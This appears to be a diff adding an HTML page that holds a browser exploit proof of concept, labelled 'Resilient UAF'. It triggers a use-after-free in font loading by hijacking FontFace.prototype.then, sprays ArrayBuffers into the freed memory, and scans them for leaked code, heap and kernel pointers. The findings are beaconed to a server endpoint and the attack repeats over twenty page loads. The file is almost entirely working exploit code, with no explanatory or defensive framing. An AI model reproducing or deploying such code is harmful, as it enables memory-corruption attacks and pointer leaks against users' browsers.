@@ -1,0 +1,183 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1117c</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+.win{color:#0f0;font-weight:bold;font-size:14px}
+</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){
+  if(typeof v!=='bigint'||v===0n)return'';
+  var hi=Number(v>>32n);
+  if(hi>=0x200&&hi<=0x7FFF)return'CODE';
+  if(hi>=0x10&&hi<=0xFF)return'HEAP';
+  if(hi>=0xFFFF8000)return'KERN';
+  if(v<0x10000n)return'small';
+  return'val';
+}
+
+// Track session across reloads via localStorage
+var sess;
+try{sess=JSON.parse(localStorage.getItem('p1117c')||'null');}catch(e){sess=null;}
+if(!sess)sess={boot:0,hits:[],misses:0,done:false};
+sess.boot++;
+try{localStorage.setItem('p1117c',JSON.stringify(sess));}catch(e){}
+
+B('P1117C-BOOT','b='+sess.boot+'|hits='+sess.hits.length+'|miss='+sess.misses);
+log('phase','=== P1117C: Resilient UAF (boot '+sess.boot+', '+sess.hits.length+' hits so far) ===');
+
+if(sess.done){
+  log('ok','Already completed! Hits: '+sess.hits.length);
+  B('P1117C-CACHED','hits='+sess.hits.length+'|data='+sess.hits.join(';;'));
+  // Show previous results
+  for(var i=0;i<sess.hits.length;i++)log('win','Hit: '+sess.hits[i]);
+}else{
+
+// Run ONE round per page load (survives any reload timing)
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var round=sess.boot-1; // use boot count as round number
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:r"+round+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var ff=new FontFace('f'+round,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);
+void ff.loaded;
+
+var fired=false,map=null,found=false;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++){map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  }
+  try{document.fonts.check('1em r'+round);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em f'+round+', r'+round,'AB').then(function(){},function(){});
+
+// Fast polling — try to find data within 250ms
+for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
+  if(found||!map)return;
+  for(var bi=20;bi<56;bi++){
+    if(!map[bi])continue;
+    var b=new BigUint64Array(map[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!found){
+      found=true;
+      var ptrs=[];
+      for(var q=0;q<b.length;q++){
+        if(b[q]!==0n)ptrs.push('+'+q*8+'='+hex64(b[q])+'('+ptrTag(b[q])+')');
+      }
+      var result='r'+round+'|bi='+bi+'|sz='+map[bi].size+'|nz='+nz+'|'+ptrs.join(',');
+      sess.hits.push(result);
+      try{localStorage.setItem('p1117c',JSON.stringify(sess));}catch(e){}
+      B('P1117C-HIT',result);
+      log('win','HIT! '+result);
+    }
+  }
+},ms);})(t);}
+
+// After 280ms, save result and start second round
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!found){
+    sess.misses++;
+    B('P1117C-MISS','r'+round);
+    log('info','Round '+round+': nz=0 (miss #'+sess.misses+')');
+  }
+  map=null;
+
+  // SECOND ROUND (different font, aggressive GC)
+  var garbage=[];
+  for(var g=0;g<30;g++)garbage.push(new ArrayBuffer(4096));
+  garbage=null;
+
+  var round2=round+100;
+  var st2=document.createElement('style');
+  st2.textContent="@font-face{font-family:g"+round2+";src:local(Courier);unicode-range:U+0043;}";
+  document.head.appendChild(st2);
+  var ff2=new FontFace('gf'+round2,'local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(ff2);void ff2.loaded;
+
+  var fired2=false,map2=null,found2=false;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired2)return undefined;fired2=true;
+    st2.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    // Extra DOM pressure
+    var tmp=document.createElement('div');
+    tmp.style.fontFamily='gf'+round2;tmp.textContent='ABCDEFGHIJ';
+    document.body.appendChild(tmp);document.body.offsetHeight;
+    document.body.removeChild(tmp);
+    map2=[];
+    // Focus on 192-byte size class + neighbors
+    for(var i=0;i<80;i++){
+      var sz=[128,160,192,192,192,224,256][i%7];
+      map2.push({size:sz,ab:new ArrayBuffer(sz)});
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em gf'+round2+', g'+round2,'CD').then(function(){},function(){});
+
+  for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
+    if(found2||!map2)return;
+    for(var bi=0;bi<map2.length;bi++){
+      var b=new BigUint64Array(map2[bi].ab);
+      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+      if(nz>0&&!found2){
+        found2=true;
+        var ptrs=[];
+        for(var q=0;q<b.length;q++){
+          if(b[q]!==0n)ptrs.push('+'+q*8+'='+hex64(b[q])+'('+ptrTag(b[q])+')');
+        }
+        var result='r'+round2+'|bi='+bi+'|sz='+map2[bi].size+'|nz='+nz+'|'+ptrs.join(',');
+        sess.hits.push(result);
+        try{localStorage.setItem('p1117c',JSON.stringify(sess));}catch(e){}
+        B('P1117C-HIT',result);
+        log('win','HIT (GC round)! '+result);
+      }
+    }
+  },ms);})(t);}
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    if(!found2){
+      sess.misses++;
+      B('P1117C-MISS2','r'+round2);
+      log('info','GC round '+round2+': nz=0');
+    }
+
+    // Mark done after 20 boots (40 total rounds)
+    if(sess.boot>=20){
+      sess.done=true;
+      try{localStorage.setItem('p1117c',JSON.stringify(sess));}catch(e){}
+      var summary='boots='+sess.boot+'|hits='+sess.hits.length+'|misses='+sess.misses;
+      if(sess.hits.length>0)summary+='|data='+sess.hits.slice(0,8).join(';;');
+      B('P1117C-FINAL',summary);
+      log('phase','=== FINAL: '+sess.hits.length+' hits in '+sess.boot+' boots ===');
+    }else{
+      try{localStorage.setItem('p1117c',JSON.stringify(sess));}catch(e){}
+      B('P1117C-STATUS','b='+sess.boot+'|h='+sess.hits.length+'|m='+sess.misses);
+    }
+  },300);
+},320);
+
+} // end if !done
+</script>
+</body></html>
